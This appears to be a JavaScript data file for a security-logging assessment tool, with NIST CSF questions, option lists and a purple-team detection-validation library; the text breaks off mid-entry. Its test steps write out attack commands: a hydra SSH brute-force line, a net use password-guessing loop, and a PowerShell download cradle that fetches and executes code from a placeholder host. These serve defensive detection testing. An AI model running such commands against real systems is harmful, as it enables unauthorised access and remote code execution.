// Assessment questions aligned with NIST CSF for logging maturity evaluation
export const assessmentQuestions = [
  // ============================================
  // IDENTIFY (ID) - Asset Management & Risk Assessment
  // ============================================
  {
    id: 'id1',
    category: 'Identify (CSF)',
    question: 'Do you maintain a comprehensive inventory of all log sources in your environment?',
    description: 'CSF ID.AM-1: Physical devices and systems are inventoried. This includes servers, network devices, applications, cloud services, and security tools.',
  },
  {
    id: 'id2',
    category: 'Identify (CSF)',
    question: 'Are log sources classified by criticality and data sensitivity?',
    description: 'CSF ID.AM-5: Resources are prioritized based on their classification, criticality, and business value.',
  },
  {
    id: 'id3',
    category: 'Identify (CSF)',
    question: 'Have you identified regulatory and compliance requirements for logging?',
    description: 'CSF ID.GV-3: Legal and regulatory requirements regarding cybersecurity are understood and managed (PCI-DSS, HIPAA, SOX, GDPR).',
  },
  {
    id: 'id4',
    category: 'Identify (CSF)',
    question: 'Is there a risk assessment that identifies logging gaps?',
    description: 'CSF ID.RA-1: Asset vulnerabilities are identified and documented, including blind spots in logging coverage.',
  },
  {
    id: 'id5',
    category: 'Identify (CSF)',
    question: 'Are data flows mapped to understand where logs should be collected?',
    description: 'CSF ID.AM-3: Communication and data flows are mapped to identify logging points.',
  },

  // ============================================
  // PROTECT (PR) - Data Security & Access Control
  // ============================================
  {
    id: 'pr1',
    category: 'Protect (CSF)',
    question: 'Are logs protected from unauthorized modification or deletion?',
    description: 'CSF PR.DS-1: Data-at-rest is protected. Log integrity is crucial for forensic investigations and compliance.',
  },
  {
    id: 'pr2',
    category: 'Protect (CSF)',
    question: 'Is access to log data restricted based on roles and responsibilities?',
    description: 'CSF PR.AC-4: Access permissions are managed using least privilege principles.',
  },
  {
    id: 'pr3',
    category: 'Protect (CSF)',
    question: 'Are logs encrypted in transit and at rest?',
    description: 'CSF PR.DS-2: Data-in-transit is protected using encryption for log shipping and storage.',
  },
  {
    id: 'pr4',
    category: 'Protect (CSF)',
    question: 'Is log storage capacity monitored and managed proactively?',
    description: 'CSF PR.DS-4: Adequate capacity to ensure availability is maintained, preventing log loss.',
  },
  {
    id: 'pr5',
    category: 'Protect (CSF)',
    question: 'Are logs being stored for an appropriate retention period?',
    description: 'CSF PR.IP-4: Backups of information are conducted and maintained. Retention should meet regulatory requirements (90 days to 1+ years).',
  },
  {
    id: 'pr6',
    category: 'Protect (CSF)',
    question: 'Is there a documented process for onboarding new log sources?',
    description: 'CSF PR.IP-1: Configuration management processes are established to ensure consistent log collection.',
  },

  // ============================================
  // DETECT (DE) - SIEM Configuration & Monitoring
  // ============================================
  {
    id: 'de1',
    category: 'Detect (CSF)',
    question: 'Do you have a SIEM or centralized log analysis platform deployed?',
    description: 'CSF DE.AE-3: Event data are aggregated and correlated from multiple sources and sensors.',
  },
  {
    id: 'de2',
    category: 'Detect (CSF)',
    question: 'Are logs normalized to a consistent format for analysis?',
    description: 'CSF DE.AE-3: Log normalization enables effective correlation and reduces analysis complexity.',
  },
  {
    id: 'de3',
    category: 'Detect (CSF)',
    question: 'Is timestamp synchronization (NTP) enforced across all log sources?',
    description: 'CSF DE.AE-1: A baseline of network operations is established. Accurate timestamps are critical for event correlation.',
  },
  {
    id: 'de4',
    category: 'Detect (CSF)',
    question: 'Are detection rules configured for credential-based attacks (brute force, credential stuffing)?',
    description: 'CSF DE.CM-1: The network is monitored for authentication anomalies and failed login patterns.',
  },
  {
    id: 'de5',
    category: 'Detect (CSF)',
    question: 'Are detection rules configured for privilege escalation attempts?',
    description: 'CSF DE.CM-3: Personnel activity is monitored for unauthorized privilege changes.',
  },
  {
    id: 'de6',
    category: 'Detect (CSF)',
    question: 'Are detection rules configured for lateral movement indicators?',
    description: 'CSF DE.CM-1: Network monitoring detects unusual internal traffic patterns (RDP, SMB, WMI, PSExec).',
  },
  {
    id: 'de7',
    category: 'Detect (CSF)',
    question: 'Are detection rules configured for data exfiltration patterns?',
    description: 'CSF DE.CM-1: Monitoring for unusual outbound data transfers, DNS tunneling, or cloud storage uploads.',
  },
  {
    id: 'de8',
    category: 'Detect (CSF)',
    question: 'Are detection rules configured for malware indicators (execution, persistence)?',
    description: 'CSF DE.CM-4: Malicious code is detected through process execution, file creation, and registry changes.',
  },
  {
    id: 'de9',
    category: 'Detect (CSF)',
    question: 'Is there a process for tuning detection rules to reduce false positives?',
    description: 'CSF DE.DP-5: Detection processes are continuously improved based on feedback.',
  },
  {
    id: 'de10',
    category: 'Detect (CSF)',
    question: 'Are SIEM correlation rules using threat intelligence feeds?',
    description: 'CSF DE.AE-2: Detected events are analyzed to understand attack targets and methods using current threat data.',
  },
  {
    id: 'de11',
    category: 'Detect (CSF)',
    question: 'Is user and entity behavior analytics (UEBA) enabled for anomaly detection?',
    description: 'CSF DE.AE-1: Baseline behavior is established to detect deviations indicating compromise.',
  },
  {
    id: 'de12',
    category: 'Detect (CSF)',
    question: 'Are SIEM dashboards configured for real-time security monitoring?',
    description: 'CSF DE.DP-4: Event detection information is communicated to appropriate parties via dashboards.',
  },

  // ============================================
  // RESPOND (RS) - Response Planning & Analysis
  // ============================================
  {
    id: 'rs1',
    category: 'Respond (CSF)',
    question: 'Are logs readily accessible for incident investigation within SLA?',
    description: 'CSF RS.AN-1: Notifications from detection systems are investigated. Analysts should access logs within minutes.',
  },
  {
    id: 'rs2',
    category: 'Respond (CSF)',
    question: 'Can you correlate logs across different sources for a single incident?',
    description: 'CSF RS.AN-3: Forensics are performed to understand the full scope using correlated data.',
  },
  {
    id: 'rs3',
    category: 'Respond (CSF)',
    question: 'Do you have documented playbooks for log-based investigation?',
    description: 'CSF RS.RP-1: Response plan is executed during or after an event using documented procedures.',
  },
  {
    id: 'rs4',
    category: 'Respond (CSF)',
    question: 'Can analysts quickly pivot between related log events during investigation?',
    description: 'CSF RS.AN-2: The impact of incidents is understood through efficient log navigation.',
  },
  {
    id: 'rs5',
    category: 'Respond (CSF)',
    question: 'Are there automated response actions triggered by log events?',
    description: 'CSF RS.MI-2: Incidents are mitigated through SOAR integration and automated containment.',
  },

  // ============================================
  // RECOVER (RC) - Recovery & Improvements
  // ============================================
  {
    id: 'rc1',
    category: 'Recover (CSF)',
    question: 'Are logging capabilities regularly reviewed and assessed?',
    description: 'CSF RC.IM-1: Recovery plans incorporate lessons learned, including logging gaps discovered.',
  },
  {
    id: 'rc2',
    category: 'Recover (CSF)',
    question: 'Is there a process to identify and address logging gaps after incidents?',
    description: 'CSF RC.IM-2: Recovery strategies are updated based on post-incident analysis.',
  },
  {
    id: 'rc3',
    category: 'Recover (CSF)',
    question: 'Is there an owner responsible for the logging program?',
    description: 'CSF RC.CO-3: Recovery activities are communicated to stakeholders with clear ownership.',
  },
  {
    id: 'rc4',
    category: 'Recover (CSF)',
    question: 'Do you have documented logging policies and standards?',
    description: 'CSF ID.GV-1: Organizational security policy is established and communicated.',
  },

  // ============================================
  // INCIDENT RESPONSE READINESS
  // ============================================
  {
    id: 'ir1',
    category: 'IR Readiness',
    question: 'Can you detect and investigate unauthorized access to user accounts?',
    description: 'Requires: Authentication logs, failed login attempts, account lockouts, unusual login times/locations.',
  },
  {
    id: 'ir2',
    category: 'IR Readiness',
    question: 'Can you detect and investigate ransomware or destructive malware incidents?',
    description: 'Requires: File system logs, process execution, registry changes, volume shadow copy deletions, mass file modifications.',
  },
  {
    id: 'ir3',
    category: 'IR Readiness',
    question: 'Can you detect and investigate business email compromise (BEC)?',
    description: 'Requires: Email gateway logs, mailbox audit logs, forwarding rule changes, OAuth app consents.',
  },
  {
    id: 'ir4',
    category: 'IR Readiness',
    question: 'Can you detect and investigate data theft or exfiltration?',
    description: 'Requires: DLP logs, cloud storage access, USB device logs, large outbound transfers, DNS query logs.',
  },
  {
    id: 'ir5',
    category: 'IR Readiness',
    question: 'Can you detect and investigate insider threat activity?',
    description: 'Requires: User activity logs, file access patterns, after-hours access, bulk downloads, print logs.',
  },
  {
    id: 'ir6',
    category: 'IR Readiness',
    question: 'Can you detect and investigate network intrusion or APT activity?',
    description: 'Requires: Firewall logs, IDS/IPS alerts, DNS logs, proxy logs, endpoint detection logs, C2 beacon patterns.',
  },
  {
    id: 'ir7',
    category: 'IR Readiness',
    question: 'Can you detect and investigate cloud service compromise?',
    description: 'Requires: Cloud audit logs (AWS CloudTrail, Azure Activity, GCP Audit), IAM changes, resource modifications.',
  },
  {
    id: 'ir8',
    category: 'IR Readiness',
    question: 'Can you detect and investigate supply chain or third-party compromise?',
    description: 'Requires: Application logs, API access logs, vendor VPN logs, service account activity.',
  },
  {
    id: 'ir9',
    category: 'IR Readiness',
    question: 'Can you detect and investigate denial of service attacks?',
    description: 'Requires: Network flow data, firewall logs, load balancer logs, application performance logs.',
  },
  {
    id: 'ir10',
    category: 'IR Readiness',
    question: 'Can you detect and investigate web application attacks (SQLi, XSS)?',
    description: 'Requires: WAF logs, web server access logs, application error logs, database query logs.',
  },
  {
    id: 'ir11',
    category: 'IR Readiness',
    question: 'Can you reconstruct a full attack timeline from initial access to impact?',
    description: 'Requires: Correlated logs across network, endpoint, identity, and application layers with consistent timestamps.',
  },
  {
    id: 'ir12',
    category: 'IR Readiness',
    question: 'Can you identify all affected systems and accounts during an incident?',
    description: 'Requires: Asset inventory integration, user-to-device mapping, network topology awareness in logs.',
  },

  // ============================================
  // DETECTION VALIDATION (Purple Team)
  // ============================================
  {
    id: 'dv1',
    category: 'Detection Validation',
    question: 'Do you perform regular atomic tests to validate log capture?',
    description: 'Purple team testing using frameworks like Atomic Red Team to verify logs are generated for simulated attacks.',
  },
  {
    id: 'dv2',
    category: 'Detection Validation',
    question: 'Are detection rules tested against simulated attacks before production deployment?',
    description: 'New detection rules should be validated with controlled test cases before going live.',
  },
  {
    id: 'dv3',
    category: 'Detection Validation',
    question: 'Do you measure time-to-detect (TTD) for validated test cases?',
    description: 'Tracking detection latency helps identify performance issues and SLA compliance.',
  },
  {
    id: 'dv4',
    category: 'Detection Validation',
    question: 'Are log field completeness and quality regularly audited?',
    description: 'Validating that expected fields (user, IP, hostname, etc.) are present and properly parsed.',
  },
  {
    id: 'dv5',
    category: 'Detection Validation',
    question: 'Do you have a schedule for recurring detection validation tests?',
    description: 'Regular testing (monthly/quarterly) ensures continued detection efficacy after changes.',
  },
  {
    id: 'dv6',
    category: 'Detection Validation',
    question: 'Are test results documented and tracked over time?',
    description: 'Maintaining a history of test results enables trend analysis and regression detection.',
  },
  {
    id: 'dv7',
    category: 'Detection Validation',
    question: 'Do you validate detection coverage against the MITRE ATT&CK framework?',
    description: 'Mapping tests to ATT&CK techniques provides comprehensive coverage measurement.',
  },
  {
    id: 'dv8',
    category: 'Detection Validation',
    question: 'Are failed validation tests tracked through remediation?',
    description: 'Gaps identified through testing should be tracked until resolved with re-validation.',
  },
  {
    id: 'dv9',
    category: 'Detection Validation',
    question: 'Do you validate that alerts reach the SOC within expected timeframes?',
    description: 'End-to-end testing from attack execution to analyst notification.',
  },
  {
    id: 'dv10',
    category: 'Detection Validation',
    question: 'Are validation results shared with stakeholders and used for prioritization?',
    description: 'Test results should inform logging program improvements and resource allocation.',
  },
];

// Status options for log sources
export const statusOptions = [
  { value: 'collected', label: 'Collected', color: 'green' },
  { value: 'partial', label: 'Partial', color: 'yellow' },
  { value: 'planned', label: 'Planned', color: 'blue' },
  { value: 'not-collected', label: 'Not Collected', color: 'gray' },
  { value: 'blocked', label: 'Blocked', color: 'red' },
];

// Relationship types between log sources
export const relationshipTypes = [
  { 
    value: 'feeds', 
    label: 'Feeds Into', 
    description: 'Source sends logs/data to target',
    color: 'blue',
    icon: 'ArrowRight'
  },
  { 
    value: 'enriches', 
    label: 'Enriches', 
    description: 'Source provides context/enrichment to target',
    color: 'purple',
    icon: 'Sparkles'
  },
  { 
    value: 'triggers', 
    label: 'Triggers', 
    description: 'Source events trigger actions in target',
    color: 'orange',
    icon: 'Zap'
  },
  { 
    value: 'depends-on', 
    label: 'Depends On', 
    description: 'Source depends on target for operation',
    color: 'red',
    icon: 'Link'
  },
  { 
    value: 'aggregates', 
    label: 'Aggregates', 
    description: 'Source aggregates logs from target',
    color: 'green',
    icon: 'Layers'
  },
  { 
    value: 'normalizes', 
    label: 'Normalizes', 
    description: 'Source normalizes/parses logs from target',
    color: 'cyan',
    icon: 'FileCode'
  },
  { 
    value: 'correlates', 
    label: 'Correlates With', 
    description: 'Source correlates events with target',
    color: 'indigo',
    icon: 'GitMerge'
  },
  { 
    value: 'mirrors', 
    label: 'Mirrors', 
    description: 'Source mirrors/replicates target data',
    color: 'gray',
    icon: 'Copy'
  },
];

// Category options for log sources
export const categoryOptions = [
  'Network',
  'Endpoint',
  'Application',
  'Cloud',
  'Identity',
  'Security',
  'Database',
  'Email',
  'Web',
  'Other',
];

// Target types (ingestion destinations)
export const targetTypes = [
  { 
    value: 'siem', 
    label: 'SIEM', 
    description: 'Security Information and Event Management',
    color: 'purple',
    icon: 'Shield'
  },
  { 
    value: 'soar', 
    label: 'SOAR', 
    description: 'Security Orchestration, Automation and Response',
    color: 'orange',
    icon: 'Zap'
  },
  { 
    value: 'data-lake', 
    label: 'Data Lake', 
    description: 'Centralized data repository for analytics',
    color: 'blue',
    icon: 'Database'
  },
  { 
    value: 'log-collector', 
    label: 'Log Collector', 
    description: 'Log aggregation and forwarding service',
    color: 'cyan',
    icon: 'Server'
  },
  { 
    value: 'cloud-storage', 
    label: 'Cloud Storage', 
    description: 'Cloud-based storage (S3, Azure Blob, GCS)',
    color: 'sky',
    icon: 'Cloud'
  },
  { 
    value: 'xdr', 
    label: 'XDR', 
    description: 'Extended Detection and Response platform',
    color: 'red',
    icon: 'Eye'
  },
  { 
    value: 'edr', 
    label: 'EDR', 
    description: 'Endpoint Detection and Response',
    color: 'green',
    icon: 'Monitor'
  },
  { 
    value: 'ndr', 
    label: 'NDR', 
    description: 'Network Detection and Response',
    color: 'indigo',
    icon: 'Network'
  },
  { 
    value: 'ticketing', 
    label: 'Ticketing System', 
    description: 'Incident/ticket management system',
    color: 'yellow',
    icon: 'Ticket'
  },
  { 
    value: 'archive', 
    label: 'Archive', 
    description: 'Long-term log archive storage',
    color: 'gray',
    icon: 'Archive'
  },
  { 
    value: 'analytics', 
    label: 'Analytics Platform', 
    description: 'Business intelligence and analytics',
    color: 'pink',
    icon: 'BarChart'
  },
  { 
    value: 'other', 
    label: 'Other', 
    description: 'Other destination type',
    color: 'slate',
    icon: 'Box'
  },
];

// Target status options
export const targetStatusOptions = [
  { value: 'active', label: 'Active', color: 'green', description: 'Target is operational and receiving logs' },
  { value: 'maintenance', label: 'Maintenance', color: 'yellow', description: 'Target is under maintenance' },
  { value: 'degraded', label: 'Degraded', color: 'orange', description: 'Target is operational but with issues' },
  { value: 'offline', label: 'Offline', color: 'red', description: 'Target is not operational' },
  { value: 'planned', label: 'Planned', color: 'blue', description: 'Target is planned for future deployment' },
  { value: 'decommissioned', label: 'Decommissioned', color: 'gray', description: 'Target is no longer in use' },
];

// Default tags for log sources
export const defaultTagOptions = [
  { value: 'critical-asset', label: 'Critical Asset', color: 'red' },
  { value: 'compliance-required', label: 'Compliance Required', color: 'purple' },
  { value: 'pci-dss', label: 'PCI-DSS', color: 'blue' },
  { value: 'hipaa', label: 'HIPAA', color: 'blue' },
  { value: 'sox', label: 'SOX', color: 'blue' },
  { value: 'gdpr', label: 'GDPR', color: 'blue' },
  { value: 'cloud', label: 'Cloud', color: 'cyan' },
  { value: 'on-prem', label: 'On-Premise', color: 'gray' },
  { value: 'legacy', label: 'Legacy', color: 'orange' },
  { value: 'new', label: 'New', color: 'green' },
  { value: 'high-volume', label: 'High Volume', color: 'yellow' },
  { value: 'low-volume', label: 'Low Volume', color: 'gray' },
  { value: 'needs-review', label: 'Needs Review', color: 'orange' },
  { value: 'validated', label: 'Validated', color: 'green' },
  { value: 'deprecated', label: 'Deprecated', color: 'red' },
];

// Compliance frameworks
export const complianceFrameworks = [
  { 
    id: 'pci-dss', 
    name: 'PCI-DSS', 
    description: 'Payment Card Industry Data Security Standard',
    requirements: [
      { id: 'pci-10.1', name: '10.1', description: 'Implement audit trails to link all access to system components to each individual user' },
      { id: 'pci-10.2', name: '10.2', description: 'Implement automated audit trails for all system components' },
      { id: 'pci-10.3', name: '10.3', description: 'Record audit trail entries for all system components for each event' },
      { id: 'pci-10.5', name: '10.5', description: 'Secure audit trails so they cannot be altered' },
      { id: 'pci-10.7', name: '10.7', description: 'Retain audit trail history for at least one year' },
    ]
  },
  { 
    id: 'hipaa', 
    name: 'HIPAA', 
    description: 'Health Insurance Portability and Accountability Act',
    requirements: [
      { id: 'hipaa-164.312-b', name: '164.312(b)', description: 'Audit controls - hardware, software, and/or procedural mechanisms to record and examine activity' },
      { id: 'hipaa-164.308-a1', name: '164.308(a)(1)', description: 'Security Management Process - implement policies and procedures' },
      { id: 'hipaa-164.312-d', name: '164.312(d)', description: 'Person or entity authentication' },
    ]
  },
  { 
    id: 'sox', 
    name: 'SOX', 
    description: 'Sarbanes-Oxley Act',
    requirements: [
      { id: 'sox-302', name: 'Section 302', description: 'Corporate responsibility for financial reports' },
      { id: 'sox-404', name: 'Section 404', description: 'Management assessment of internal controls' },
    ]
  },
  { 
    id: 'nist-csf', 
    name: 'NIST CSF', 
    description: 'NIST Cybersecurity Framework',
    requirements: [
      { id: 'nist-de.ae', name: 'DE.AE', description: 'Anomalies and Events - Anomalous activity is detected' },
      { id: 'nist-de.cm', name: 'DE.CM', description: 'Security Continuous Monitoring' },
      { id: 'nist-pr.ds', name: 'PR.DS', description: 'Data Security - Information is protected' },
      { id: 'nist-rs.an', name: 'RS.AN', description: 'Analysis - Investigation and forensics conducted' },
    ]
  },
];

// Onboarding checklist steps
export const onboardingSteps = [
  {
    id: 'identify',
    title: 'Identify Source',
    description: 'Define the log source and its characteristics',
    fields: ['name', 'category', 'description', 'logType'],
  },
  {
    id: 'ownership',
    title: 'Assign Ownership',
    description: 'Determine who is responsible for this log source',
    fields: ['ownerTeam', 'ownerContact', 'criticalityTier'],
  },
  {
    id: 'compliance',
    title: 'Compliance & Tags',
    description: 'Tag for compliance requirements and categorization',
    fields: ['tags', 'retention'],
  },
  {
    id: 'technical',
    title: 'Technical Configuration',
    description: 'Document collection method and requirements',
    fields: ['collectionMethod', 'networkRequirements', 'credentials'],
  },
  {
    id: 'validation',
    title: 'Validation Plan',
    description: 'Plan for validating log collection',
    fields: ['validationPlan', 'expectedFields', 'sampleQuery'],
  },
  {
    id: 'review',
    title: 'Review & Submit',
    description: 'Review all information and create the source',
    fields: [],
  },
];

// Log type options
export const logTypeOptions = [
  { value: 'syslog', label: 'Syslog' },
  { value: 'windows-event', label: 'Windows Event Log' },
  { value: 'json', label: 'JSON' },
  { value: 'cef', label: 'CEF (Common Event Format)' },
  { value: 'leef', label: 'LEEF (Log Event Extended Format)' },
  { value: 'csv', label: 'CSV' },
  { value: 'xml', label: 'XML' },
  { value: 'netflow', label: 'NetFlow/IPFIX' },
  { value: 'pcap', label: 'PCAP' },
  { value: 'api', label: 'API/Webhook' },
  { value: 'database', label: 'Database Query' },
  { value: 'file', label: 'Flat File' },
  { value: 'cloud-native', label: 'Cloud Native' },
  { value: 'other', label: 'Other' },
];

// Criticality tier options
export const criticalityTierOptions = [
  { value: 'tier-1', label: 'Tier 1 - Critical', description: 'Business critical systems, core security infrastructure' },
  { value: 'tier-2', label: 'Tier 2 - High', description: 'Important production systems, key applications' },
  { value: 'tier-3', label: 'Tier 3 - Medium', description: 'Standard business systems' },
  { value: 'tier-4', label: 'Tier 4 - Low', description: 'Development, test, non-critical systems' },
];

// Retention period options
export const retentionOptions = [
  { value: '7d', label: '7 Days' },
  { value: '14d', label: '14 Days' },
  { value: '30d', label: '30 Days' },
  { value: '60d', label: '60 Days' },
  { value: '90d', label: '90 Days' },
  { value: '180d', label: '180 Days (6 months)' },
  { value: '365d', label: '365 Days (1 year)' },
  { value: '730d', label: '730 Days (2 years)' },
  { value: '1825d', label: '5 Years' },
  { value: '2555d', label: '7 Years' },
  { value: 'custom', label: 'Custom' },
];

// Assessment response options
export const assessmentResponseOptions = [
  { value: 'yes', label: 'Yes', score: 2 },
  { value: 'partial', label: 'Partial', score: 1 },
  { value: 'no', label: 'No', score: 0 },
  { value: 'na', label: 'N/A', score: null },
];

// Default columns for the inventory table
export const defaultColumns = [
  { id: 'name', label: 'Source Name', visible: true },
  { id: 'category', label: 'Category', visible: true },
  { id: 'status', label: 'Status', visible: true },
  { id: 'logType', label: 'Log Type', visible: true },
  { id: 'criticalityTier', label: 'Criticality Tier', visible: true },
  { id: 'ownerTeam', label: 'Owner Team', visible: true },
  { id: 'ownerContact', label: 'Owner Contact', visible: false },
  { id: 'retention', label: 'Retention', visible: false },
  { id: 'description', label: 'Description', visible: false },
  { id: 'notes', label: 'Notes', visible: false },
  { id: 'lastUpdated', label: 'Last Updated', visible: false },
];

// ============================================
// VALIDATION TEST LIBRARY (Purple Team)
// ============================================
export const validationTestLibrary = [
  // Initial Access
  {
    id: 'vt-t1078-001',
    name: 'Valid Account - Local Account Login',
    tactic: 'Initial Access',
    technique: 'T1078.001',
    techniqueName: 'Valid Accounts: Default Accounts',
    description: 'Test detection of successful authentication using local accounts',
    expectedLogSources: ['Windows Security', 'Linux Auth', 'PAM'],
    testProcedure: 'Authenticate using a local account and verify login event is captured',
    expectedFields: ['username', 'source_ip', 'logon_type', 'timestamp'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4624 (Successful Logon) with Logon Type 2 (Interactive) or 10 (Remote Interactive)',
        'Linux /var/log/auth.log or /var/log/secure entries showing "Accepted password" or "session opened"',
        'Account name, source workstation/IP, and authentication package used'
      ],
      howToTest: [
        'On Windows: Log in interactively to a test workstation using a local account (not domain-joined)',
        'On Linux: SSH into a test system using local credentials: ssh localuser@target-system',
        'For RDP: Connect to a system using local credentials via Remote Desktop',
        'Record the exact timestamp of your test login for correlation'
      ],
      expectedAlerts: [
        'New local account login from unexpected source',
        'First-time login for local account (UEBA baseline deviation)',
        'Local account used on domain-joined system (policy violation)'
      ],
      siemQueryExample: 'event.code:4624 AND winlog.event_data.LogonType:(2 OR 10) AND NOT user.domain:YOURDOMAIN',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md'
    }
  },
  {
    id: 'vt-t1078-002',
    name: 'Valid Account - Domain Account Login',
    tactic: 'Initial Access',
    technique: 'T1078.002',
    techniqueName: 'Valid Accounts: Domain Accounts',
    description: 'Test detection of successful domain authentication',
    expectedLogSources: ['Windows Security', 'Active Directory', 'Domain Controller'],
    testProcedure: 'Authenticate using domain credentials and verify event 4624 is logged',
    expectedFields: ['username', 'domain', 'source_ip', 'logon_type', 'workstation'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4624 on the target workstation showing domain logon',
        'Windows Event ID 4768 (TGT Request) on Domain Controller',
        'Windows Event ID 4769 (TGS Request) on Domain Controller',
        'Logon Type 3 (Network), 10 (RDP), or 2 (Interactive) depending on method'
      ],
      howToTest: [
        'Log into a domain-joined workstation using domain\\username credentials',
        'Map a network drive: net use Z: \\\\server\\share /user:DOMAIN\\username',
        'RDP to a domain system using domain credentials',
        'Test from an unusual source IP or at unusual hours for anomaly detection'
      ],
      expectedAlerts: [
        'Logon from new/unusual source IP or geolocation',
        'After-hours domain authentication',
        'Domain admin account used on non-admin workstation',
        'Multiple systems accessed in short timeframe (lateral movement indicator)'
      ],
      siemQueryExample: 'event.code:4624 AND user.domain:YOURDOMAIN AND source.ip:* | stats count by user.name, source.ip',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.002/T1078.002.md'
    }
  },
  {
    id: 'vt-t1110-001',
    name: 'Brute Force - Password Guessing',
    tactic: 'Initial Access',
    technique: 'T1110.001',
    techniqueName: 'Brute Force: Password Guessing',
    description: 'Test detection of multiple failed login attempts',
    expectedLogSources: ['Windows Security', 'Linux Auth', 'Azure AD', 'Okta'],
    testProcedure: 'Attempt 10+ failed logins against a test account within 5 minutes',
    expectedFields: ['username', 'source_ip', 'failure_reason', 'timestamp'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4625 (Failed Logon) - multiple occurrences in short time',
        'Sub Status codes: 0xC000006A (wrong password), 0xC0000064 (user not found)',
        'Linux: "Failed password" entries in auth.log with same source',
        'Azure AD: Sign-in failures in Azure AD sign-in logs',
        'Pattern: Same source IP attempting multiple usernames OR same username from single source'
      ],
      howToTest: [
        'Windows: for /L %i in (1,1,15) do net use \\\\target\\c$ /user:testuser wrongpass%i',
        'Linux: Use hydra or medusa against SSH: hydra -l testuser -P wordlist.txt ssh://target',
        'Manually attempt 10+ wrong passwords against a test account',
        'CAUTION: Coordinate with IT to avoid account lockouts on production accounts'
      ],
      expectedAlerts: [
        'Brute force attack detected - X failed logins in Y minutes',
        'Account lockout triggered',
        'Password spray attack (multiple users, same password)',
        'Credential stuffing attempt from known bad IP'
      ],
      siemQueryExample: 'event.code:4625 | stats count by source.ip, user.name | where count > 5',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.md'
    }
  },
  {
    id: 'vt-t1566-001',
    name: 'Phishing - Spearphishing Attachment',
    tactic: 'Initial Access',
    technique: 'T1566.001',
    techniqueName: 'Phishing: Spearphishing Attachment',
    description: 'Test detection of malicious email attachment delivery',
    expectedLogSources: ['Email Gateway', 'Microsoft 365', 'Exchange'],
    testProcedure: 'Send test email with EICAR attachment and verify detection',
    expectedFields: ['sender', 'recipient', 'subject', 'attachment_name', 'verdict'],
    guidance: {
      whatToLookFor: [
        'Email gateway logs showing attachment scanning verdict',
        'Microsoft 365 Threat Protection alerts in Security & Compliance Center',
        'Safe Attachments detonation results',
        'Attachment file type, hash, and sandbox analysis results',
        'User click/open events if attachment was delivered'
      ],
      howToTest: [
        'EICAR Test: Create file with content: X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
        'Send email with EICAR.txt attachment from external source to test mailbox',
        'Test with password-protected ZIP containing EICAR to test extraction',
        'Use GTPhish or similar to send simulated phishing with macro-enabled doc',
        'IMPORTANT: Use test/sandbox accounts and coordinate with email security team'
      ],
      expectedAlerts: [
        'Malicious attachment blocked/quarantined',
        'Suspicious file type detected (macro-enabled Office docs)',
        'Zero-day threat detected via sandbox detonation',
        'User opened/clicked malicious attachment'
      ],
      siemQueryExample: 'source:"email_gateway" AND verdict:("malicious" OR "suspicious") AND attachment:*',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/T1566.001.md'
    }
  },

  // Execution
  {
    id: 'vt-t1059-001',
    name: 'PowerShell Execution',
    tactic: 'Execution',
    technique: 'T1059.001',
    techniqueName: 'Command and Scripting Interpreter: PowerShell',
    description: 'Test logging of PowerShell command execution',
    expectedLogSources: ['Windows PowerShell', 'Sysmon', 'EDR'],
    testProcedure: 'Execute encoded PowerShell command and verify ScriptBlock logging (4104)',
    expectedFields: ['command_line', 'script_block', 'user', 'parent_process'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4104 (Script Block Logging) - shows deobfuscated PowerShell',
        'Windows Event ID 4103 (Module Logging) - shows pipeline execution details',
        'Sysmon Event ID 1 (Process Create) with powershell.exe and command line',
        'Look for encoded commands (-enc, -e), download cradles (IEX, Invoke-Expression)',
        'Suspicious parent processes (Word, Excel, WScript launching PowerShell)'
      ],
      howToTest: [
        'Basic: powershell.exe -Command "Write-Host \'Test\'"',
        'Encoded: powershell.exe -enc dwByAGkAdABlAC0AaABvAHMAdAAgACIAdABlAHMAdAAiAA==',
        'Download cradle: powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString(\'http://test.local/test.txt\')"',
        'Ensure PowerShell Script Block Logging is enabled via GPO',
        'SAFE TEST: powershell.exe -c "$a=\'Hello\';$b=\'World\';Write-Host $a$b"'
      ],
      expectedAlerts: [
        'Encoded PowerShell execution detected',
        'PowerShell download cradle detected',
        'Suspicious PowerShell spawned by Office application',
        'PowerShell executing from unusual path',
        'AMSI bypass attempt detected'
      ],
      siemQueryExample: 'event.code:4104 AND powershell.scriptblock:("Invoke-Expression" OR "IEX" OR "DownloadString" OR "FromBase64String")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md'
    }
  },
  {
    id: 'vt-t1059-003',
    name: 'Windows Command Shell',
    tactic: 'Execution',
    technique: 'T1059.003',
    techniqueName: 'Command and Scripting Interpreter: Windows Command Shell',
    description: 'Test logging of cmd.exe execution',
    expectedLogSources: ['Sysmon', 'Windows Security', 'EDR'],
    testProcedure: 'Execute suspicious cmd commands and verify process creation logging',
    expectedFields: ['command_line', 'user', 'parent_process', 'process_id'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 (Process Create) with cmd.exe and full command line',
        'Windows Event ID 4688 (Process Creation) if command line auditing is enabled',
        'Suspicious parent processes (services.exe, wmiprvse.exe, Office apps)',
        'Commands using && or | for chaining multiple operations',
        'Reconnaissance commands: whoami, net user, ipconfig, systeminfo'
      ],
      howToTest: [
        'Basic: cmd.exe /c whoami && hostname && ipconfig',
        'Recon chain: cmd.exe /c "net user & net localgroup administrators & systeminfo"',
        'Spawn from unusual parent: wmic process call create "cmd.exe /c whoami"',
        'File operations: cmd.exe /c "dir C:\\Users\\* /s /b > C:\\temp\\files.txt"',
        'Ensure command line process auditing is enabled (GPO or Sysmon)'
      ],
      expectedAlerts: [
        'Suspicious process chain detected',
        'Reconnaissance command execution',
        'cmd.exe spawned by unexpected parent process',
        'Command shell executing encoded/obfuscated commands'
      ],
